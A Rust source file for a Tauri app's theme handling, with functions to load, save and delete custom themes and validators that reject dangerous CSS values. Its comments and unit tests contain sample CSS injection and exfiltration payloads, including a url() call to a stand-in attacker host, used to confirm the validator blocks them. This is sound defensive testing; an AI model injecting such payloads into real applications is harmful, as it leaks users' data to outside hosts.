use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::PathBuf;
use tauri::AppHandle;
use tauri::Manager;

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct ThemeTerminal {
    pub foreground: String,
    pub background: String,
    #[serde(rename = "backgroundInactive")]
    pub background_inactive: String,
    #[serde(rename = "paneBackground")]
    pub pane_background: String,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct ThemeDef {
    pub name: String,
    pub variables: HashMap<String, String>,
    pub terminal: ThemeTerminal,
}

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

const BUILT_IN_THEMES: &[&str] = &["dark", "medium", "light"];
const MAX_THEME_FILE_SIZE: u64 = 100 * 1024; // 100 KB
const MAX_VAR_KEYS: usize = 500;
const MAX_VAR_VALUE_LEN: usize = 500;
const MAX_THEME_KEY_LEN: usize = 64;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/// Get the custom themes directory (app_config_dir/themes/).
fn custom_themes_dir(app: &AppHandle) -> Result<PathBuf, String> {
    let config_dir = app
        .path()
        .app_config_dir()
        .map_err(|e| format!("failed to resolve app config dir: {e}"))?;
    let dir = config_dir.join("themes");
    if !dir.exists() {
        std::fs::create_dir_all(&dir).map_err(|e| format!("failed to create themes dir: {e}"))?;
    }
    Ok(dir)
}

/// Get the bundled resources directory.
fn resources_dir(app: &AppHandle) -> Result<PathBuf, String> {
    let resource_dir = app
        .path()
        .resource_dir()
        .map_err(|e| format!("failed to resolve resource dir: {e}"))?;
    Ok(resource_dir.join("resources"))
}

/// Validate a theme key: alphanumeric + hyphens/underscores, no Windows reserved names.
fn validate_theme_key(key: &str) -> Result<(), String> {
    if key.is_empty() || key.len() > MAX_THEME_KEY_LEN {
        return Err(format!(
            "theme key must be 1-{MAX_THEME_KEY_LEN} characters"
        ));
    }
    let re = regex_lite::Regex::new(r"^[a-zA-Z0-9][a-zA-Z0-9_\-]*$").expect("valid regex");
    if !re.is_match(key) {
        return Err("theme key must be alphanumeric with hyphens/underscores".into());
    }
    // Block Windows reserved names
    let upper = key.to_ascii_uppercase();
    let reserved = [
        "CON", "PRN", "AUX", "NUL", "COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7", "COM8",
        "COM9", "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9",
    ];
    if reserved.contains(&upper.as_str()) {
        return Err(format!("'{key}' is a reserved name"));
    }
    Ok(())
}

/// Reject CSS values that could trigger external loads or break out of the
/// custom-property declaration when consumed via `var(--x)` inside a stylesheet
/// rule. The frontend pipes these straight to `element.style.setProperty(--name, value)`
/// (see `src/utils/applyTheme.ts`), so a value like `url("https://attacker/x")`
/// inside a value later used by `background-image: var(--x)` would exfiltrate.
fn validate_var_value(value: &str) -> Result<(), String> {
    let lower = value.to_ascii_lowercase();
    if lower.contains("url(") {
        return Err("theme value cannot contain url(...)".into());
    }
    if value.contains([';', '{', '}', '<', '>', '\n', '\r']) {
        return Err("theme value cannot contain ; { } < > or newlines".into());
    }
    Ok(())
}

/// Validate theme data structure.
fn validate_theme_data(data: &ThemeDef) -> Result<(), String> {
    if data.name.is_empty() || data.name.len() > 100 {
        return Err("theme name must be 1-100 characters".into());
    }
    if data.variables.len() > MAX_VAR_KEYS {
        return Err(format!(
            "theme cannot have more than {MAX_VAR_KEYS} variables"
        ));
    }
    for (k, v) in &data.variables {
        if k.len() > MAX_VAR_VALUE_LEN || v.len() > MAX_VAR_VALUE_LEN {
            return Err(format!(
                "variable key/value exceeds {MAX_VAR_VALUE_LEN} characters"
            ));
        }
        validate_var_value(v)?;
    }
    validate_var_value(&data.terminal.foreground)?;
    validate_var_value(&data.terminal.background)?;
    validate_var_value(&data.terminal.background_inactive)?;
    validate_var_value(&data.terminal.pane_background)?;
    Ok(())
}

/// Read and parse a theme JSON file.
fn read_theme_file(path: &std::path::Path) -> Result<ThemeDef, String> {
    let meta =
        std::fs::metadata(path).map_err(|e| format!("cannot read {}: {e}", path.display()))?;
    if meta.len() > MAX_THEME_FILE_SIZE {
        return Err(format!("theme file {} exceeds max size", path.display()));
    }
    let contents = std::fs::read_to_string(path)
        .map_err(|e| format!("failed to read {}: {e}", path.display()))?;
    serde_json::from_str(&contents).map_err(|e| format!("failed to parse {}: {e}", path.display()))
}

// ---------------------------------------------------------------------------
// Commands
// ---------------------------------------------------------------------------

#[derive(Debug, Serialize)]
pub struct SaveThemeResult {
    pub success: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
}

/// Load all themes: built-in from resources + custom from app config dir.
#[tauri::command]
pub async fn get_themes(app: AppHandle) -> Result<HashMap<String, ThemeDef>, String> {
    let mut themes = HashMap::new();

    // 1. Load built-in themes from bundled resources
    let res_dir = resources_dir(&app)?;
    for &key in BUILT_IN_THEMES {
        let path = res_dir.join(format!("{key}.json"));
        match read_theme_file(&path) {
            Ok(theme) => {
                themes.insert(key.to_string(), theme);
            }
            Err(e) => {
                log::warn!("failed to load built-in theme '{key}': {e}");
            }
        }
    }

    // 2. Load custom themes from app config dir
    let custom_dir = custom_themes_dir(&app)?;
    if let Ok(entries) = std::fs::read_dir(&custom_dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.extension().and_then(|e| e.to_str()) != Some("json") {
                continue;
            }
            let key = path
                .file_stem()
                .and_then(|s| s.to_str())
                .unwrap_or_default()
                .to_string();
            // Skip if same name as built-in (built-in takes precedence)
            if BUILT_IN_THEMES.contains(&key.as_str()) {
                continue;
            }
            match read_theme_file(&path) {
                Ok(theme) => {
                    themes.insert(key, theme);
                }
                Err(e) => {
                    log::warn!("skipping custom theme {}: {e}", path.display());
                }
            }
        }
    }

    Ok(themes)
}

/// Save a custom theme.
#[tauri::command]
pub async fn save_custom_theme(
    app: AppHandle,
    theme_key: String,
    theme_data: ThemeDef,
) -> Result<SaveThemeResult, String> {
    // Validate key
    if let Err(e) = validate_theme_key(&theme_key) {
        return Ok(SaveThemeResult {
            success: false,
            error: Some(e),
        });
    }

    // Cannot overwrite built-in themes
    if BUILT_IN_THEMES.contains(&theme_key.as_str()) {
        return Ok(SaveThemeResult {
            success: false,
            error: Some("cannot overwrite built-in theme".into()),
        });
    }

    // Validate data
    if let Err(e) = validate_theme_data(&theme_data) {
        return Ok(SaveThemeResult {
            success: false,
            error: Some(e),
        });
    }

    let custom_dir = custom_themes_dir(&app)?;
    let path = custom_dir.join(format!("{theme_key}.json"));
    let json = serde_json::to_string_pretty(&theme_data)
        .map_err(|e| format!("failed to serialize theme: {e}"))?;
    std::fs::write(&path, json).map_err(|e| format!("failed to write theme: {e}"))?;

    log::info!("saved custom theme '{theme_key}' to {}", path.display());
    Ok(SaveThemeResult {
        success: true,
        error: None,
    })
}

/// Delete a custom theme.
#[tauri::command]
pub async fn delete_custom_theme(
    app: AppHandle,
    theme_key: String,
) -> Result<SaveThemeResult, String> {
    // Validate key
    if let Err(e) = validate_theme_key(&theme_key) {
        return Ok(SaveThemeResult {
            success: false,
            error: Some(e),
        });
    }

    // Cannot delete built-in themes
    if BUILT_IN_THEMES.contains(&theme_key.as_str()) {
        return Ok(SaveThemeResult {
            success: false,
            error: Some("cannot delete built-in theme".into()),
        });
    }

    let custom_dir = custom_themes_dir(&app)?;
    let path = custom_dir.join(format!("{theme_key}.json"));

    if !path.exists() {
        return Ok(SaveThemeResult {
            success: false,
            error: Some(format!("theme '{theme_key}' not found")),
        });
    }

    std::fs::remove_file(&path).map_err(|e| format!("failed to delete theme: {e}"))?;

    log::info!("deleted custom theme '{theme_key}'");
    Ok(SaveThemeResult {
        success: true,
        error: None,
    })
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    /// The built-in themes exist twice on disk: `resources/` at the repo root is
    /// the canonical source (imported at build time by `src/themes/defaults.ts`),
    /// while `src-tauri/resources/` is what `tauri.conf.json` actually bundles and
    /// what [`get_themes`] reads at runtime. Because `useThemes` merges as
    /// `{ ...DEFAULT_THEMES, ...loaded }`, the bundled copy wins wholesale — so if
    /// the two drift, the app ships the stale palette and any variable missing
    /// from the bundled copy is simply never applied. They did drift once: the
    /// bundled files sat untouched from v2.0.0-beta1 while the canonical ones
    /// gained 19 variables, which left the connecting-tab and letterbox colours
    /// pinned to whichever theme happened to load first. This test is the guard.
    #[test]
    fn bundled_themes_match_the_canonical_ones() {
        let bundled_dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("resources");
        let canonical_dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .parent()
            .expect("src-tauri always has a parent")
            .join("resources");

        for &key in BUILT_IN_THEMES {
            let file = format!("{key}.json");
            let bundled = std::fs::read_to_string(bundled_dir.join(&file))
                .unwrap_or_else(|e| panic!("cannot read bundled {file}: {e}"));
            let canonical = std::fs::read_to_string(canonical_dir.join(&file))
                .unwrap_or_else(|e| panic!("cannot read canonical {file}: {e}"));

            // Compare parsed values, not bytes: the two copies may legitimately
            // differ in line endings or trailing newline.
            let bundled: serde_json::Value = serde_json::from_str(&bundled)
                .unwrap_or_else(|e| panic!("bundled {file} is not valid JSON: {e}"));
            let canonical: serde_json::Value = serde_json::from_str(&canonical)
                .unwrap_or_else(|e| panic!("canonical {file} is not valid JSON: {e}"));

            assert_eq!(
                bundled, canonical,
                "src-tauri/resources/{file} has drifted from the canonical \
                 resources/{file}. Copy the canonical file over the bundled one — \
                 the bundled copy is what ships and it overrides the build-time \
                 defaults at runtime."
            );
        }
    }

    #[test]
    fn validate_theme_key_valid() {
        assert!(validate_theme_key("my-theme").is_ok());
        assert!(validate_theme_key("custom_dark_1").is_ok());
        assert!(validate_theme_key("A").is_ok());
    }

    #[test]
    fn validate_theme_key_invalid() {
        assert!(validate_theme_key("").is_err());
        assert!(validate_theme_key("-starts-with-dash").is_err());
        assert!(validate_theme_key("has space").is_err());
        assert!(validate_theme_key("a".repeat(65).as_str()).is_err());
        assert!(validate_theme_key("CON").is_err());
        assert!(validate_theme_key("nul").is_err());
    }

    #[test]
    fn validate_theme_data_ok() {
        let theme = ThemeDef {
            name: "Test Theme".into(),
            variables: HashMap::from([("bg-primary".into(), "#000000".into())]),
            terminal: ThemeTerminal {
                foreground: "#fff".into(),
                background: "#000".into(),
                background_inactive: "#000".into(),
                pane_background: "#000".into(),
            },
        };
        assert!(validate_theme_data(&theme).is_ok());
    }

    #[test]
    fn validate_theme_data_empty_name() {
        let theme = ThemeDef {
            name: String::new(),
            variables: HashMap::new(),
            terminal: ThemeTerminal {
                foreground: "#fff".into(),
                background: "#000".into(),
                background_inactive: "#000".into(),
                pane_background: "#000".into(),
            },
        };
        assert!(validate_theme_data(&theme).is_err());
    }

    #[test]
    fn validate_theme_data_rejects_url_in_value() {
        let theme = ThemeDef {
            name: "Bad".into(),
            variables: HashMap::from([(
                "bg-primary".into(),
                r#"red url("https://attacker/x?leak=1")"#.into(),
            )]),
            terminal: ThemeTerminal {
                foreground: "#fff".into(),
                background: "#000".into(),
                background_inactive: "#000".into(),
                pane_background: "#000".into(),
            },
        };
        let err = validate_theme_data(&theme).unwrap_err();
        assert!(err.contains("url"));
    }

    #[test]
    fn validate_theme_data_rejects_structural_chars_in_value() {
        for bad in [
            "red; background-image: url(x)",
            "red}body{display:none",
            "rgb(0,0,0)<script>",
            "red\nbackground:url(x)",
        ] {
            let theme = ThemeDef {
                name: "Bad".into(),
                variables: HashMap::from([("bg-primary".into(), bad.into())]),
                terminal: ThemeTerminal {
                    foreground: "#fff".into(),
                    background: "#000".into(),
                    background_inactive: "#000".into(),
                    pane_background: "#000".into(),
                },
            };
            assert!(
                validate_theme_data(&theme).is_err(),
                "expected rejection of: {bad}"
            );
        }
    }

    #[test]
    fn validate_theme_data_rejects_url_in_terminal_color() {
        let theme = ThemeDef {
            name: "Bad".into(),
            variables: HashMap::new(),
            terminal: ThemeTerminal {
                foreground: r#"url("http://x")"#.into(),
                background: "#000".into(),
                background_inactive: "#000".into(),
                pane_background: "#000".into(),
            },
        };
        assert!(validate_theme_data(&theme).is_err());
    }

    #[test]
    fn validate_theme_data_too_many_vars() {
        let mut vars = HashMap::new();
        for i in 0..501 {
            vars.insert(format!("var-{i}"), "#000".into());
        }
        let theme = ThemeDef {
            name: "Test".into(),
            variables: vars,
            terminal: ThemeTerminal {
                foreground: "#fff".into(),
                background: "#000".into(),
                background_inactive: "#000".into(),
                pane_background: "#000".into(),
            },
        };
        assert!(validate_theme_data(&theme).is_err());
    }

    #[test]
    fn builtin_themes_cannot_be_overwritten() {
        for key in BUILT_IN_THEMES {
            assert!(validate_theme_key(key).is_ok()); // key is valid format
            assert!(BUILT_IN_THEMES.contains(key)); // but it's built-in
        }
    }

    #[test]
    fn theme_def_serializes() {
        let theme = ThemeDef {
            name: "Dark".into(),
            variables: HashMap::from([("bg-primary".into(), "#000".into())]),
            terminal: ThemeTerminal {
                foreground: "#fff".into(),
                background: "#000".into(),
                background_inactive: "#111".into(),
                pane_background: "#222".into(),
            },
        };
        let json = serde_json::to_string(&theme).unwrap();
        assert!(json.contains("backgroundInactive"));
        assert!(json.contains("paneBackground"));

        let parsed: ThemeDef = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.name, "Dark");
    }

    #[test]
    fn theme_def_deserializes_from_file_format() {
        let json = r##"{
            "name": "Test",
            "variables": { "bg-primary": "#000" },
            "terminal": {
                "foreground": "#fff",
                "background": "#000",
                "backgroundInactive": "#111",
                "paneBackground": "#222"
            }
        }"##;
        let theme: ThemeDef = serde_json::from_str(json).unwrap();
        assert_eq!(theme.terminal.background_inactive, "#111");
        assert_eq!(theme.terminal.pane_background, "#222");
    }

    #[test]
    fn save_theme_result_serializes() {
        let ok = SaveThemeResult {
            success: true,
            error: None,
        };
        let json = serde_json::to_string(&ok).unwrap();
        assert!(!json.contains("error")); // skipped when None

        let err = SaveThemeResult {
            success: false,
            error: Some("bad".into()),
        };
        let json = serde_json::to_string(&err).unwrap();
        assert!(json.contains("\"error\":\"bad\""));
    }
}
